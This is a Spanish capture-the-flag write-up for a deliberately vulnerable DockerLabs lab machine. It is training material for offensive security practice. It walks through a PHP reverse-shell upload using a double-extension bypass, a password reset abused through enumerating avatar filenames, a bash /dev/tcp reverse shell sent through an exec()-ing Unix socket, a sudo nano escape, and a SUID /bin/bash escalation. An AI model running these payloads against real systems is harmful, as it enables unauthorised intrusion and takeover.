---
icon: flag
---

# ApacheByte DockerLabs (Intermediate)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip apachebyte.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh apachebyte.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-09 02:52 EDT
Nmap scan report for thedog.dl (172.17.0.2)
Host is up (0.000035s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1b:a6:6b:55:9c:c7:98:b3:ac:01:00:21:2f:67:9a:3e (ECDSA)
|_  256 68:bd:c1:ad:61:e1:5d:e9:2b:f8:d1:f1:7d:16:fe:4c (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Blog
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.79 seconds
```

Veremos que un puerto `80` en el que habra una pagina web alojada, si entramos en dicha pagina web veremos una pagina normal sin nada interesante, pero con un `login` si le damos al boton llamado `Login para dar Like`, aqui vamos a probar diferentes credenciales por defecto sin suerte, por lo que probaremos a realizar un `SQLi` facilito a ver si fuera vulnerable.

```
User: ' OR 1=1-- -
Pass: ' OR 1=1-- -
```

Vemos que nos pone usuario invalido, pero cuando metemos `admin:admin` nos pone Nombre de usuario o contraseña incorrectos, por lo que ya sabemos que `admin` existe.

Pero debajo veremos un boton para registrarnos, si lo hacemos y accedemos con las credenciales de las cuales nos acabamos de registrar, veremos un panel en el que podremos dar `like` a dicha seccion.

Si le damos al boton no pasara nada, pero veremos que hay un apartado llamado `Cuenta` en el que si le damos nos llevara a nuestro perfil, en el podremos ver que podemos subir una foto de perfil, vamos a probar a realizar un `LFI` o un `RCE` mediante la subida de un archivo en vez de, de una imagen a ver si podemos.

## Escalate user www-data

Vamos a crearnos el siguiente archivo.

> shell.php

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Si lo intentamos subir veremos que no funciona, por lo que vamos a subir una foto normal para ver como responde la pagina.

Veremos que una imagen normal se sube de forma correcta, pero tambien podemos cambiar la contraseña del usuario, se nos ocurre que podemos intentar cambiar la contraseña del usuario `manager`, para ello vamos a capturar la peticion de cambiarla con `BurpSuite` y veremos algo asi:

```
POST /account.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 80
Origin: http://172.17.0.2
Connection: keep-alive
Referer: http://172.17.0.2/account.php
Cookie: PHPSESSID=un90l8o0mrkeas2gef3d3lqvci
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=diseo&numero=4552058398984283&new_password=diseo&confirm_password=diseo
```

Si probamos a donde pone `username` poner `manager` y le damos a `ENTER` veremos en la respuesta del servidor que pone `Usuario no encontrado` por lo que tendremos que saber el numero exacto del usuario `manager` para cambiarlo en la seccion llamada `numero`, vamos a ver en que formato y en que nombre se guardan las fotos de perfil.

Ya que cuando enviamos la peticion de cambiar la contraseña tambien vemos el nombre de la foto de perfil.

```html
<img src="uploads/avatars/4552058398984283.jpg" alt="Avatar" class="avatar">
```

Vamos a ver la siguiente carpeta.

```
URL = http://<IP>/uploads/avatars/
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-06-09 093345.png" alt=""><figcaption></figcaption></figure>

Veremos que si esta el numero de nuestro usuario y el del `manager` por lo que podremos realizar lo siguiente en la peticion de cambiar la contraseña.

```
POST /account.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 80
Origin: http://172.17.0.2
Connection: keep-alive
Referer: http://172.17.0.2/account.php
Cookie: PHPSESSID=un90l8o0mrkeas2gef3d3lqvci
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=manager&numero=5597527595641235&new_password=diseo&confirm_password=diseo
```

Tendremos que dejarlo asi con el nombre de usuario `manager` y el numero del `manager` que hemos encontrado en el nombre de la imagen de perfil de dicho usuario.

Si lo enviamos veremos que se cambio la contraseña de dicho usuario de forma exitosa, por lo que vamos a probar a iniciar sesion con las credenciales que hemos cambiado.

Vemos que ha funcionado y veremos un boton llamado `dashboard` en el que veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-06-09 093624.png" alt=""><figcaption></figcaption></figure>

Vemos que podemos subir un archivo, esta vez vamos a probar a subir de nuevo el archivo `PHP` a ver si nos deja.

Le daremos a `Nuevo Post` y probaremos a subir dicho archivo, pero no nos dejara, por lo que vamos a realizar el mismo proceso de antes, vamos a subir una imagen al servidor y ver donde se esta subiendo, para ver que vemos algo interesante.

Una vez que hayamos subido la imagen, le daremos a `Guardar cambios` y vamos a donde pone `Casa`, ahi veremos la imagen subida.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-06-09 120032.png" alt=""><figcaption></figcaption></figure>

Vamos a darle `click` derecho e irnos a la opcion llamada `Open Image in new Tab`, una vez echo esto, veremos en la `URL` lo siguiente:

```
/posts/uploads/foto
```

Vemos que no esta mostrando la extension `.jpg` parece ser que la esta borrando, por lo que se nos ocurre realizar lo siguiente:

```shell
mv shell.php shell.php.jpg
```

Ahora vamos a subir ese archivo a un `POST` en la web, ya que como borra la primera extension se quedara en `.php` vamos a probar a subir el archivo de nuevo.

Al subir la imagen se nos sube bien y se queda a nivel de codigo asi:

```html
<img src="posts/uploads/shell.php" alt="Imagen subida">
```

Por lo que vemos se esta subiendo de forma correcta sin las extension de `.jpg`, ahora estando a la escucha de esta forma:

```shell
nc -lvnp <PORT>
```

Vamos a darle a `Guardar Cambios`, le daremos a `Casa`, si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.177.129] from (UNKNOWN) [172.17.0.2] 55062
whoami
www-data
```

Veremos que ha funcionado, por lo que vamos a `sanitizar` la shell.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user juan

Si listamos la carpeta `/tmp` veremos el siguiente archivo:

```
total 8
drwxrwxrwt 1 root root 4096 Jun  9 12:03 .
drwxr-xr-x 1 root root 4096 Jun  9 08:52 ..
srwxrwxrwx 1 juan juan    0 Jun  9 08:52 dev.sock
```

Vemos lo que parece una configuracion de un `socket` a algo, por lo que vamos a realizar una busqueda a ver si hubiera algun archivo respecto a dicho `socket`.

```shell
find / \( -path /usr -o -path /proc \) -prune -o -name "sock*" -print 2>/dev/null
```

Info:

```
/run/apache2/socks
/etc/systemd/system/sockets.target.wants
/etc/php/8.3/mods-available/sockets.ini
/sys/kernel/slab/sock_inode_cache
/var/backups/socket.zip
/var/lib/systemd/deb-systemd-helper-enabled/sockets.target.wants
/var/lib/php/modules/8.3/cli/enabled_by_maint/sockets
/var/lib/php/modules/8.3/apache2/enabled_by_maint/sockets
/var/lib/php/modules/8.3/registry/sockets
```

Vemos una cosa interesante y es la siguiente linea:

```
/var/backups/socket.zip
```

Vamos a descomprimirlo y ver que contiene.

```shell
cd /tmp
unzip /var/backups/socket.zip
```

Vemos que nos extrae parte de la `/home` del usuario `juan` por lo que vamos a ver que contiene, si entramos veremos un archivo llamado `socket_server.py` que si lo leemos veremos esto.

```python
import socket
import os

sock_path = "/tmp/dev.sock"
if os.path.exists(sock_path):
    os.remove(sock_path)

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind(sock_path)
os.chmod(sock_path, 0o777)
server.listen(1)

while True:
    try:
        conn, _ = server.accept()
        data = conn.recv(2048)

        if data:
            try:
                exec(data.decode(), {"__builtins__": __builtins__})
                conn.send(b"Executed.\n")
            except Exception as e:
                conn.send(str(e).encode())

        conn.close()
    except:
        break

server.close()
```

Parece ser que es un servidor `socket` que esta realizando una conexion con el archivo de `/tmp` el que encontramos anteriormente en el cual cualquier usuario se puede conectar al `socket` y ejecutar cualquier cosa como el usuario `juan` por lo que vamos a crear una `reverse shell`.

Pero antes vamos a probar que los comandos se esten ejecutando bien:

```shell
echo 'import subprocess; raise Exception(subprocess.check_output("id", shell=True).decode())' | nc -U /tmp/dev.sock
```

Info:

```
uid=1001(juan) gid=1001(juan) groups=1001(juan)
```

Vemos que esta funcionando, ya que estamos capturando la excepcion y mostrandola por pantalla, ya que de otra forma no funcionaria para mostrarnos el comando.

Vamos a realizar la `reverse shell` ya.

```shell
echo 'import subprocess; raise Exception(subprocess.check_output("bash -c \"bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\"", shell=True, stderr=subprocess.STDOUT).decode())' | nc -U /tmp/dev.sock
```

Pero antes de darle a `ENTER` vamos a ponernos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora si enviamos el anterior comando y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7755 ...
connect to [192.168.177.129] from (UNKNOWN) [172.17.0.2] 54816
bash: cannot set terminal process group (49): Inappropriate ioctl for device
bash: no job control in this shell
juan@c5f5169bfe06:~$ whoami
whoami
juan
```

Vemos que ha funcionado, por lo que vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user alex

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for juan on c5f5169bfe06:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User juan may run the following commands on c5f5169bfe06:
    (alex) NOPASSWD: /bin/nano
```

Vemos que podemos ejecutar como el usuario `alex` el binario `nano` por lo que podremos ser el usuario `alex` de esta forma:

```shell
sudo -u alex nano
^R^X
reset; bash 1>&0 2>&0
```

Y con esto ya seremos dicho usuario.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for alex on c5f5169bfe06:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User alex may run the following commands on c5f5169bfe06:
    (ALL) NOPASSWD: /usr/local/bin/report_tool
```

Vemos que podemos ejecutar el binario `report_tool` como el usuario `root` por lo que vamos a investigar que hace dicho binario.

Si lo leemos veremos lo siguiente:

```bash
#!/bin/bash
#
# report_tool: muestra la fecha o, si existe override, usa tu PATH local

CONF_FILE="./report_tool.conf"
if [ -r "$CONF_FILE" ]; then
    source "$CONF_FILE"
    if [ -n "$OVERRIDE_PATH" ]; then
        export PATH="$OVERRIDE_PATH:$PATH"
    fi
fi
exec date
```

Vemos una vulnerabilidad muy grave, podemos crear un archivo llamado `report_tool.conf` y dentro de el, exportar el `OVERRIDE_PATH` con un `Path Hijacking` por lo que podremos realizar lo siguiente:

```shell
cd /tmp
echo '/bin/bash -c "chmod u+s /bin/bash"' > ./report_tool.conf
chmod +x report_tool.conf
sudo /usr/local/bin/report_tool
```

Ahora si vemos que permisos tiene la `bash`.

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Veremos que ha funcionado, por lo que haremos lo siguiente:

```shell
bash -p
```

Info:

```
bash-5.2# whoami
root
```

Con esto veremos que seremos `root`, por lo que habremos terminado la maquina.
